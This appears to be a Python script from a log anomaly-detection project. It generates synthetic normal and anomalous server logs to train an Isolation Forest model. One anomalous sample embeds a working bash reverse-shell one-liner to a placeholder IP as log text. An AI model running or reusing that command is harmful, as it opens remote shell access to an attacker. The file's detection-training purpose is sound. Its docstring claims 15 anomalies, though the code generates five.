"""
Générateur de données d'entraînement réalistes

Pourquoi ce fichier ?
  Isolation Forest a besoin d'un minimum de données "normales" pour
  apprendre la baseline. En production ce sont de vrais logs serveur.
  En dev, on génère des logs réalistes pour démontrer le modèle.

  Ce script génère :
    - 200 logs normaux (trafic web, auth, DNS, etc.)
    - 15 logs anormaux cachés dedans (port inhabituels, payloads longs, etc.)
  Ensuite on entraîne et on vérifie que le modèle les détecte.
"""

import random
from datetime import datetime, timedelta
from sqlalchemy.orm import Session
from app.schemas.schemas import LogEntryCreate
from app.services.ingestion import LogIngestionService


INTERNAL_IPS  = [f"192.168.1.{i}" for i in range(5, 30)] + [f"10.0.0.{i}" for i in range(1, 20)]
EXTERNAL_IPS  = [f"203.0.113.{i}" for i in range(1, 50)] + [f"198.51.100.{i}" for i in range(1, 30)]
NORMAL_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit",
    "curl/7.81.0",
    "python-requests/2.28.0",
]


def generate_normal_logs(n: int = 200) -> list[LogEntryCreate]:
    """Génère N logs de trafic normal réaliste."""
    logs = []
    templates = [
        # Trafic HTTP normal
        lambda: LogEntryCreate(
            source_ip  = random.choice(INTERNAL_IPS),
            dest_ip    = "192.168.1.100",
            dest_port  = random.choice([80, 443]),
            source_port= random.randint(32768, 60999),
            protocol   = "TCP",
            event_type = "http_request",
            message    = f"GET /{random.choice(['index.html','api/data','dashboard','login','static/app.js'])} HTTP/1.1 {random.choice([200,200,200,304,404])} OK",
            hostname   = "web-server-01"
        ),
        # Auth SSH normale
        lambda: LogEntryCreate(
            source_ip  = random.choice(INTERNAL_IPS),
            dest_ip    = "192.168.1.50",
            dest_port  = 22,
            protocol   = "TCP",
            event_type = random.choice(["login_success", "login_success", "login_failed"]),
            message    = f"{'Accepted password' if random.random() > 0.2 else 'Failed password'} for {random.choice(['admin','devops','ubuntu'])} from {random.choice(INTERNAL_IPS)}",
            username   = random.choice(["admin", "devops", "ubuntu"]),
            hostname   = "ssh-server-01"
        ),
        # DNS normal
        lambda: LogEntryCreate(
            source_ip  = random.choice(INTERNAL_IPS),
            dest_port  = 53,
            protocol   = "UDP",
            event_type = "dns_query",
            message    = f"Query: {random.choice(['google.com','github.com','api.stripe.com','cdn.example.com'])} A",
            hostname   = "dns-resolver"
        ),
        # DB interne
        lambda: LogEntryCreate(
            source_ip  = random.choice(INTERNAL_IPS[:5]),
            dest_ip    = "10.0.0.20",
            dest_port  = random.choice([3306, 5432]),
            protocol   = "TCP",
            event_type = "http_request",
            message    = f"SELECT * FROM {random.choice(['users','orders','products'])} WHERE id={random.randint(1,1000)}",
            hostname   = "db-server-01"
        ),
    ]
    for _ in range(n):
        logs.append(random.choice(templates)())
    return logs


def generate_anomalous_logs() -> list[LogEntryCreate]:
    """
    Génère des logs anormaux réalistes.
    Ces comportements dévient de la baseline et devraient être détectés.
    """
    return [
        # Port inhabituel — C2 possible
        LogEntryCreate(
            source_ip="203.0.113.88", dest_port=31337, protocol="TCP",
            event_type="http_request",
            message="Connexion sortante vers port non standard depuis serveur interne"
        ),
        # Message extrêmement long — exfiltration possible
        LogEntryCreate(
            source_ip="10.0.0.8", dest_port=443, protocol="TCP",
            event_type="http_request",
            message="POST /upload " + "A" * 900 + " data_exfil_pattern"
        ),
        # Heure nocturne + IP externe + auth
        LogEntryCreate(
            source_ip="198.51.100.200", dest_port=22, protocol="TCP",
            event_type="login_failed",
            message="Failed password for root from 198.51.100.200 port 52143",
            username="root"
        ),
        # Port scan — connexions multiples sur ports rares
        LogEntryCreate(
            source_ip="203.0.113.7", dest_port=4444, protocol="TCP",
            event_type="port_scan",
            message="SYN scan detected on non-standard port"
        ),
        # Commande système suspecte
        LogEntryCreate(
            source_ip="10.0.0.15", dest_port=80, protocol="TCP",
            event_type="command_exec",
            message="bash -i >& /dev/tcp/203.0.113.5/4444 0>&1 reverse shell attempt"
        ),
    ]


def seed_training_data(db: Session) -> dict:
    """
    Injecte les données d'entraînement en base.
    Appelé via POST /api/ml/seed-data
    """
    service = LogIngestionService(db)
    normal   = generate_normal_logs(200)
    abnormal = generate_anomalous_logs()

    # Injecter le trafic normal
    n_ok = 0
    for log in normal:
        try:
            service.ingest_single(log)
            n_ok += 1
        except Exception:
            pass

    # Injecter les anomalies (mélangées)
    a_ok = 0
    for log in abnormal:
        try:
            service.ingest_single(log)
            a_ok += 1
        except Exception:
            pass

    return {
        "normal_logs_injected"   : n_ok,
        "anomalous_logs_injected": a_ok,
        "total"                  : n_ok + a_ok,
        "message"                : "Données d'entraînement générées. Lance maintenant POST /api/ml/train"
    }
